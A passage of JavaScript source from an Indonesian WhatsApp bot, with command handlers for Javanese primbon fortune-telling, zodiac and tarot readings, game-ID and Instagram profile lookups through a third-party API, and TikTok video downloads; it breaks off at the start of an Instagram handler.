                hisoka.sendText(m.chat, `│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ *Nama :* ${anu.message.nama}\n│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ *Lahir :* ${anu.message.tgl_lahir}\n│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ *Life Path :* ${anu.message.life_path}\n│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ *Destiny :* ${anu.message.destiny}\n│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ *Destiny Desire :* ${anu.message.destiny_desire}\n│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ *Personality :* ${anu.message.personality}\n│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ *Persentase :* ${anu.message.persentase_kecocokan}`, m)
            }
            break
            case 'kecocokanpasangan': case 'cocokpasangan': case 'pasangan': {
                if (!text) throw `Example : ${prefix + command} Dika|Novia`
                let [nama1, nama2] = text.split`|`
                let anu = await primbon.kecocokan_nama_pasangan(nama1, nama2)
                if (anu.status == false) return m.reply(anu.message)
                hisoka.sendImage(m.chat,  anu.message.gambar, `│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ *Nama Anda :* ${anu.message.nama_anda}\n│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ *Nama Pasangan :* ${anu.message.nama_pasangan}\n│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ *Sisi Positif :* ${anu.message.sisi_positif}\n│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ *Sisi Negatif :* ${anu.message.sisi_negatif}`, m)
            }
            break
            case 'jadianpernikahan': case 'jadiannikah': {
                if (!text) throw `Example : ${prefix + command} 6, 12, 2020`
                let [tgl, bln, thn] = text.split`,`
                let anu = await primbon.tanggal_jadian_pernikahan(tgl, bln, thn)
                if (anu.status == false) return m.reply(anu.message)
                hisoka.sendText(m.chat, `│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ *Tanggal Pernikahan :* ${anu.message.tanggal}\n│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ *karakteristik :* ${anu.message.karakteristik}`, m)
            }
            break
            case 'sifatusaha': {
                if (!ext)throw `Example : ${prefix+ command} 28, 12, 2021`
                let [tgl, bln, thn] = text.split`,`
                let anu = await primbon.sifat_usaha_bisnis(tgl, bln, thn)
                if (anu.status == false) return m.reply(anu.message)
                hisoka.sendText(m.chat, `│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ *Lahir :* ${anu.message.hari_lahir}\n│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ *Usaha :* ${anu.message.usaha}`, m)
            }
            break
            case 'rejeki': case 'rezeki': {
                if (!text) throw `Example : ${prefix + command} 7, 7, 2005`
                let [tgl, bln, thn] = text.split`,`
                let anu = await primbon.rejeki_hoki_weton(tgl, bln, thn)
                if (anu.status == false) return m.reply(anu.message)
                hisoka.sendText(m.chat, `│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ *Lahir :* ${anu.message.hari_lahir}\n│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ *Rezeki :* ${anu.message.rejeki}\n│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ *Catatan :* ${anu.message.catatan}`, m)
            }
            break
            case 'pekerjaan': case 'kerja': {
                if (!text) throw `Example : ${prefix + command} 7, 7, 2005`
                let [tgl, bln, thn] = text.split`,`
                let anu = await primbon.pekerjaan_weton_lahir(tgl, bln, thn)
                if (anu.status == false) return m.reply(anu.message)
                hisoka.sendText(m.chat, `│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ *Lahir :* ${anu.message.hari_lahir}\n│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ *Pekerjaan :* ${anu.message.pekerjaan}\n│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ *Catatan :* ${anu.message.catatan}`, m)
            }
            break
            case 'ramalannasib': case 'ramalnasib': case 'nasib': {
                if (!text) throw `Example : 7, 7, 2005`
                let [tgl, bln, thn] = text.split`,`
                let anu = await primbon.ramalan_nasib(tgl, bln, thn)
                if (anu.status == false) return m.reply(anu.message)
                hisoka.sendText(m.chat, `│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ *Analisa :* ${anu.message.analisa}\n│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ *Angka Akar :* ${anu.message.angka_akar}\n│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ *Sifat :* ${anu.message.sifat}\n│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ *Elemen :* ${anu.message.elemen}\n│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ *Angka Keberuntungan :* ${anu.message.angka_keberuntungan}`, m)
            }
            break
            case 'potensipenyakit': case 'penyakit': {
                if (!text) throw `Example : ${prefix + command} 7, 7, 2005`
                let [tgl, bln, thn] = text.split`,`
                let anu = await primbon.cek_potensi_penyakit(tgl, bln, thn)
                if (anu.status == false) return m.reply(anu.message)
                hisoka.sendText(m.chat, `│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ *Analisa :* ${anu.message.analisa}\n│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ *Sektor :* ${anu.message.sektor}\n│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ *Elemen :* ${anu.message.elemen}\n│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ *Catatan :* ${anu.message.catatan}`, m)
            }
            break
            case 'artitarot': case 'tarot': {
                if (!text) throw `Example : ${prefix + command} 7, 7, 2005`
                let [tgl, bln, thn] = text.split`,`
                let anu = await primbon.arti_kartu_tarot(tgl, bln, thn)
                if (anu.status == false) return m.reply(anu.message)
                hisoka.sendImage(m.chat, anu.message.image, `│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ *Lahir :* ${anu.message.tgl_lahir}\n│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ *Simbol Tarot :* ${anu.message.simbol_tarot}\n│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ *Arti :* ${anu.message.arti}\n│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ *Catatan :* ${anu.message.catatan}`, m)
            }
            break
            case 'fengshui': {
                if (!text) throw `Example : ${prefix + command} Dika, 1, 2005\n\nNote : ${prefix + command} Nama, gender, tahun lahir\nGender : 1 untuk laki-laki & 2 untuk perempuan`
                let [nama, gender, tahun] = text.split`,`
                let anu = await primbon.perhitungan_feng_shui(nama, gender, tahun)
                if (anu.status == false) return m.reply(anu.message)
                hisoka.sendText(m.chat, `│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ *Nama :* ${anu.message.nama}\n│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ *Lahir :* ${anu.message.tahun_lahir}\n│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ *Gender :* ${anu.message.jenis_kelamin}\n│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ *Angka Kua :* ${anu.message.angka_kua}\n│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ *Kelompok :* ${anu.message.kelompok}\n│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ *Karakter :* ${anu.message.karakter}\n│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ *Sektor Baik :* ${anu.message.sektor_baik}\n│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ *Sektor Buruk :* ${anu.message.sektor_buruk}`, m)
            }
            break
            case 'haribaik': {
                if (!text) throw `Example : ${prefix + command} 7, 7, 2005`
                let [tgl, bln, thn] = text.split`,`
                let anu = await primbon.petung_hari_baik(tgl, bln, thn)
                if (anu.status == false) return m.reply(anu.message)
                hisoka.sendText(m.chat, `│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ *Lahir :* ${anu.message.tgl_lahir}\n│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ *Kala Tinantang :* ${anu.message.kala_tinantang}\n│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ *Info :* ${anu.message.info}\n│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ *Catatan :* ${anu.message.catatan}`, m)
            }
            break
            case 'harisangar': case 'taliwangke': {
                if (!text) throw `Example : ${prefix + command} 7, 7, 2005`
                let [tgl, bln, thn] = text.split`,`
                let anu = await primbon.hari_sangar_taliwangke(tgl, bln, thn)
                if (anu.status == false) return m.reply(anu.message)
                hisoka.sendText(m.chat, `│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ *Lahir :* ${anu.message.tgl_lahir}\n│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ *Hasil :* ${anu.message.result}\n│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ *Info :* ${anu.message.info}\n│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ *Catatan :* ${anu.message.catatan}`, m)
            }
            break
            case 'harinaas': case 'harisial': {
                if (!text) throw `Example : ${prefix + command} 7, 7, 2005`
                let [tgl, bln, thn] = text.split`,`
                let anu = await primbon.primbon_hari_naas(tgl, bln, thn)
                if (anu.status == false) return m.reply(anu.message)
                hisoka.sendText(m.chat, `│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ *Hari Lahir :* ${anu.message.hari_lahir}\n│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ *Tanggal Lahir :* ${anu.message.tgl_lahir}\n│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ *Hari Naas :* ${anu.message.hari_naas}\n│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ *Info :* ${anu.message.catatan}\n│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ *Catatan :* ${anu.message.info}`, m)
            }
            break
            case 'nagahari': case 'harinaga': {
                if (!text) throw `Example : ${prefix + command} 7, 7, 2005`
                let [tgl, bln, thn] = text.split`,`
                let anu = await primbon.rahasia_naga_hari(tgl, bln, thn)
                if (anu.status == false) return m.reply(anu.message)
                hisoka.sendText(m.chat, `│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ *Hari Lahir :* ${anu.message.hari_lahir}\n│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ *Tanggal Lahir :* ${anu.message.tgl_lahir}\n│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ *Arah Naga Hari :* ${anu.message.arah_naga_hari}\n│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ *Catatan :* ${anu.message.catatan}`, m)
            }
            break
            case 'arahrejeki': case 'arahrezeki': {
                if (!text) throw `Example : ${prefix + command} 7, 7, 2005`
                let [tgl, bln, thn] = text.split`,`
                let anu = await primbon.primbon_arah_rejeki(tgl, bln, thn)
                if (anu.status == false) return m.reply(anu.message)
                hisoka.sendText(m.chat, `│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ *Hari Lahir :* ${anu.message.hari_lahir}\n│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ *tanggal Lahir :* ${anu.message.tgl_lahir}\n│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ *Arah Rezeki :* ${anu.message.arah_rejeki}\n│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ *Catatan :* ${anu.message.catatan}`, m)
            }
            break
            case 'peruntungan': {
                if (!text) throw `Example : ${prefix + command} DIka, 7, 7, 2005, 2022\n\nNote : ${prefix + command} Nama, tanggal lahir, bulan lahir, tahun lahir, untuk tahun`
                let [nama, tgl, bln, thn, untuk] = text.split`,`
                let anu = await primbon.ramalan_peruntungan(nama, tgl, bln, thn, untuk)
                if (anu.status == false) return m.reply(anu.message)
                hisoka.sendText(m.chat, `│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ *Nama :* ${anu.message.nama}\n│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ *Lahir :* ${anu.message.tgl_lahir}\n│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ *Peruntungan Tahun :* ${anu.message.peruntungan_tahun}\n│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ *Hasil :* ${anu.message.result}\n│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ *Catatan :* ${anu.message.catatan}`, m)
            }
            break
            case 'weton': case 'wetonjawa': {
                if (!text) throw `Example : ${prefix + command} 7, 7, 2005`
                let [tgl, bln, thn] = text.split`,`
                let anu = await primbon.weton_jawa(tgl, bln, thn)
                if (anu.status == false) return m.reply(anu.message)
                hisoka.sendText(m.chat, `│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ *Tanggal :* ${anu.message.tanggal}\n│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ *Jumlah Neptu :* ${anu.message.jumlah_neptu}\n│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ *Watak Hari :* ${anu.message.watak_hari}\n│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ *Naga Hari :* ${anu.message.naga_hari}\n│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ *Jam Baik :* ${anu.message.jam_baik}\n│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ *Watak Kelahiran :* ${anu.message.watak_kelahiran}`, m)
            }
            break
            case 'sifat': case 'karakter': {
                if (!text) throw `Example : ${prefix + command} Dika, 7, 7, 2005`
                let [nama, tgl, bln, thn] = text.split`,`
                let anu = await primbon.sifat_karakter_tanggal_lahir(nama, tgl, bln, thn)
                if (anu.status == false) return m.reply(anu.message)
                hisoka.sendText(m.chat, `│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ *Nama :* ${anu.message.nama}\n│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ *Lahir :* ${anu.message.tgl_lahir}\n│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ *Garis Hidup :* ${anu.message.garis_hidup}`, m)
            }
            break
            case 'keberuntungan': {
                if (!text) throw `Example : ${prefix + command} Dika, 7, 7, 2005`
                let [nama, tgl, bln, thn] = text.split`,`
                let anu = await primbon.potensi_keberuntungan(nama, tgl, bln, thn)
                if (anu.status == false) return m.reply(anu.message)
                hisoka.sendText(m.chat, `│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ *Nama :* ${anu.message.nama}\n│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ *Lahir :* ${anu.message.tgl_lahir}\n│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ *Hasil :* ${anu.message.result}`, m)
            }
            break
            case 'memancing': {
                if (!text) throw `Example : ${prefix + command} 12, 1, 2022`
                let [tgl, bln, thn] = text.split`,`
                let anu = await primbon.primbon_memancing_ikan(tgl, bln, thn)
                if (anu.status == false) return m.reply(anu.message)
                hisoka.sendText(m.chat, `│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ *Tanggal :* ${anu.message.tgl_memancing}\n│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ *Hasil :* ${anu.message.result}\n│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ *Catatan :* ${anu.message.catatan}`, m)
            }
            break
            case 'masasubur': {
                if (!text) throw `Example : ${prefix + command} 12, 1, 2022, 28\n\nNote : ${prefix + command} hari pertama menstruasi, siklus`
                let [tgl, bln, thn, siklus] = text.split`,`
                let anu = await primbon.masa_subur(tgl, bln, thn, siklus)
                if (anu.status == false) return m.reply(anu.message)
                hisoka.sendText(m.chat, `│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ *Hasil :* ${anu.message.result}\n│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ *Catatan :* ${anu.message.catatan}`, m)
            }
            break
            case 'zodiak': case 'zodiac': {
                if (!text) throw `Example : ${prefix+ command} 7 7 2005`
                let zodiak = [
                    ["capricorn", new Date(1970, 0, 1)],
                    ["aquarius", new Date(1970, 0, 20)],
                    ["pisces", new Date(1970, 1, 19)],
                    ["aries", new Date(1970, 2, 21)],
                    ["taurus", new Date(1970, 3, 21)],
                    ["gemini", new Date(1970, 4, 21)],
                    ["cancer", new Date(1970, 5, 22)],
                    ["leo", new Date(1970, 6, 23)],
                    ["virgo", new Date(1970, 7, 23)],
                    ["libra", new Date(1970, 8, 23)],
                    ["scorpio", new Date(1970, 9, 23)],
                    ["sagittarius", new Date(1970, 10, 22)],
                    ["capricorn", new Date(1970, 11, 22)]
                ].reverse()

                function getZodiac(month, day) {
                    let d = new Date(1970, month - 1, day)
                    return zodiak.find(([_,_d]) => d >= _d)[0]
                }
                let date = new Date(text)
                if (date == 'Invalid Date') throw date
                let d = new Date()
                let [tahun, bulan, tanggal] = [d.getFullYear(), d.getMonth() + 1, d.getDate()]
                let birth = [date.getFullYear(), date.getMonth() + 1, date.getDate()]

                let zodiac = await getZodiac(birth[1], birth[2])
                
                let anu = await primbon.zodiak(zodiac)
                if (anu.status == false) return m.reply(anu.message)
                hisoka.sendText(m.chat, `│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ *Zodiak :* ${anu.message.zodiak}\n│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ *Nomor :* ${anu.message.nomor_keberuntungan}\n│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ *Aroma :* ${anu.message.aroma_keberuntungan}\n│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ *Planet :* ${anu.message.planet_yang_mengitari}\n│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ *Bunga :* ${anu.message.bunga_keberuntungan}\n│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ *Warna :* ${anu.message.warna_keberuntungan}\n│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ *Batu :* ${anu.message.batu_keberuntungan}\n│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ *Elemen :* ${anu.message.elemen_keberuntungan}\n│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ *Pasangan Zodiak :* ${anu.message.pasangan_zodiak}\n│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ *Catatan :* ${anu.message.catatan}`, m)
            }
            break
            case 'shio': {
                if (!text) throw `Example : ${prefix + command} tikus\n\nNote : For Detail https://primbon.com/shio.htm`
                let anu = await primbon.shio(text)
                if (anu.status == false) return m.reply(anu.message)
                hisoka.sendText(m.chat, `│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ *Hasil :* ${anu.message}`, m)
            }
            break
	    case 'stalker': case 'stalk': {
		if (!isPremium && global.db.data.users[m.sender].limit < 1) return m.reply('Limit Harian Anda Telah Habis')
                if (!text) return m.reply(`Example : ${prefix +command} type id\n\nList Type :\n1. ff (Free Fire)\n2. ml (Mobile Legends)\n3. aov (Arena Of Valor)\n4. cod (Call Of Duty)\n5. pb (point Blank)\n6. ig (Instagram)\n7. npm (https://npmjs.com)`)
                let [type, id, zone] = args
                if (type.toLowerCase() == 'ff') {
                    if (!id) throw `No Query id, Example ${prefix + command} ff 552992060`
                    let anu = await fetchJson(api('zenz', '/api/nickff', { apikey: global.APIKeys[global.APIs['zenz']], query: id }))
                    if (anu.status == false) return m.reply(anu.result.message)
                    m.reply(`ID : ${anu.result.gameId}\nUsername : ${anu.result.userName}`)
		    db.data.users[m.sender].limit -= 1
                } else if (type.toLowerCase() == 'ml') {
                    if (!id) throw `No Query id, Example : ${prefix + command} ml 214885010 2253`
                    if (!zone) throw `No Query id, Example : ${prefix + command} ml 214885010 2253`
                    let anu = await fetchJson(api('zenz', '/api/nickml', { apikey: global.APIKeys[global.APIs['zenz']], query: id, query2: zone }))
                    if (anu.status == false) return m.reply(anu.result.message)
                    m.reply(`ID : ${anu.result.gameId}\nZone : ${anu.result.zoneId}\nUsername : ${anu.result.userName}`)
		    db.data.users[m.sender].limit -= 1
                } else if (type.toLowerCase() == 'aov') {
                    if (!id) throw `No Query id, Example ${prefix + command} aov 293306941441181`
                    let anu = await fetchJson(api('zenz', '/api/nickaov', { apikey: global.APIKeys[global.APIs['zenz']], query: id }))
                    if (anu.status == false) return m.reply(anu.result.message)
                    m.reply(`ID : ${anu.result.gameId}\nUsername : ${anu.result.userName}`)
		    db.data.users[m.sender].limit -= 1
                } else if (type.toLowerCase() == 'cod') {
                    if (!id) throw `No Query id, Example ${prefix + command} cod 6290150021186841472`
                    let anu = await fetchJson(api('zenz', '/api/nickcod', { apikey: global.APIKeys[global.APIs['zenz']], query: id }))
                    if (anu.status == false) return m.reply(anu.result.message)
                    m.reply(`ID : ${anu.result.gameId}\nUsername : ${anu.result.userName}`)
		    db.data.users[m.sender].limit -= 1
                } else if (type.toLowerCase() == 'pb') {
                    if (!id) throw `No Query id, Example ${prefix + command} pb riio46`
                    let anu = await fetchJson(api('zenz', '/api/nickpb', { apikey: global.APIKeys[global.APIs['zenz']], query: id }))
                    if (anu.status == false) return m.reply(anu.result.message)
                    m.reply(`ID : ${anu.result.gameId}\nUsername : ${anu.result.userName}`)
		    db.data.users[m.sender].limit -= 1
                } else if (type.toLowerCase() == 'ig') {
                    if (!id) throw `No Query username, Example : ${prefix + command} ig cak_haho`
                    let { result: anu } = await fetchJson(api('zenz', '/api/stalker/ig', { username: id }, 'apikey'))
                    if (anu.status == false) return m.reply(anu.result.message)
                    hisoka.sendMedia(m.chat, anu.caption.profile_hd, '', `│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ Full Name : ${anu.caption.full_name}\n│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ User Name : ${anu.caption.user_name}\n│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ ID ${anu.caption.user_id}\n│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ Followers : ${anu.caption.followers}\n│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ Following : ${anu.caption.following}\n│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ Bussines : ${anu.caption.bussines}\n│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ Profesional : ${anu.caption.profesional}\n│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ Verified : ${anu.caption.verified}\n│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ Private : ${anu.caption.private}\n│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ Bio : ${anu.caption.biography}\n│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ Bio Url : ${anu.caption.bio_url}`, m)
		    db.data.users[m.sender].limit -= 1
                } else if (type.toLowerCase() == 'npm') {
                    if (!id) throw `No Query username, Example : ${prefix + command} npm scrape-primbon`
                    let { result: anu } = await fetchJson(api('zenz', '/api/stalker/npm', { query: id }, 'apikey'))
                    if (anu.status == false) return m.reply(anu.result.message)
                    m.reply(`│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ Name : ${anu.name}\n│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ Version : ${Object.keys(anu.versions)}\n│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ Created : ${tanggal(anu.time.created)}\n│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ Modified : ${tanggal(anu.time.modified)}\n│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ Maintainers :\n ${anu.maintainers.map(v => `- ${v.name} : ${v.email}`).join('\n')}\n\n│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ Description : ${anu.description}\n│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ Homepage : ${anu.homepage}\n│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ Keywords : ${anu.keywords}\n│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ Author : ${anu.author.name}\n│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ License : ${anu.license}\n│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ Readme : ${anu.readme}`)
		    db.data.users[m.sender].limit -= 1
                } else {
                    m.reply(`Example : ${prefix +command} type id\n\nList Type :\n1. ff (Free Fire)\n2. ml (Mobile Legends)\n3. aov (Arena Of Valor)\n4. cod (Call Of Duty)\n5. pb (point Blank)\n6. ig (Instagram)\n7. npm (https://npmjs.com)`)
                }
            }
            break
	        case 'tiktok': case 'tiktoknowm': {
                if (!text) throw 'Masukkan Query Link!'
                m.reply(mess.wait)
                let anu = await fetchJson(api('zenz', '/downloader/tiktok', { url: text }, 'apikey'))
                let buttons = [
                    {buttonId: `tiktokwm ${text}`, buttonText: {displayText: '► With Watermark'}, type: 1},
                    {buttonId: `tiktokmp3 ${text}`, buttonText: {displayText: '♫ Audio'}, type: 1}
                ]
                let buttonMessage = {
                    video: { url: anu.result.nowatermark },
                    caption: `Download From ${text}`,
                    footer: 'Press The Button Below',
                    buttons: buttons,
                    headerType: 5
                }
                hisoka.sendMessage(m.chat, buttonMessage, { quoted: m })
            }
            break
            case 'tiktokwm': case 'tiktokwatermark': {
                if (!text) throw 'Masukkan Query Link!'
                m.reply(mess.wait)
                let anu = await fetchJson(api('zenz', '/downloader/tiktok', { url: text }, 'apikey'))
                let buttons = [
                    {buttonId: `tiktoknowm ${text}`, buttonText: {displayText: '► No Watermark'}, type: 1},
                    {buttonId: `tiktokmp3 ${text}`, buttonText: {displayText: '♫ Audio'}, type: 1}
                ]
                let buttonMessage = {
                    video: { url: anu.result.watermark },
                    caption: `Download From ${text}`,
                    footer: 'Press The Button Below',
                    buttons: buttons,
                    headerType: 5
                }
                hisoka.sendMessage(m.chat, buttonMessage, { quoted: m })
            }
            break
            case 'tiktokmp3': case 'tiktokaudio': {
                if (!text) throw 'Masukkan Query Link!'
                m.reply(mess.wait)
                let anu = await fetchJson(api('zenz', '/downloader/musically', { url: text }, 'apikey'))
                let buttons = [
                    {buttonId: `tiktoknowm ${text}`, buttonText: {displayText: '► No Watermark'}, type: 1},
                    {buttonId: `tiktokwm ${text}`, buttonText: {displayText: '► With Watermark'}, type: 1}
                ]
                let buttonMessage = {
                    text: `Download From ${text}`,
                    footer: 'Press The Button Below',
                    buttons: buttons,
                    headerType: 2
                }
                let msg = await hisoka.sendMessage(m.chat, buttonMessage, { quoted: m })
                hisoka.sendMessage(m.chat, { audio: { url: anu.result.audio }, mimetype: 'audio/mpeg'}, { quoted: msg })
            }
            break
	        case 'instagram': case 'ig': case 'igdl': {
                if (!text) throw 'No Query Url!'
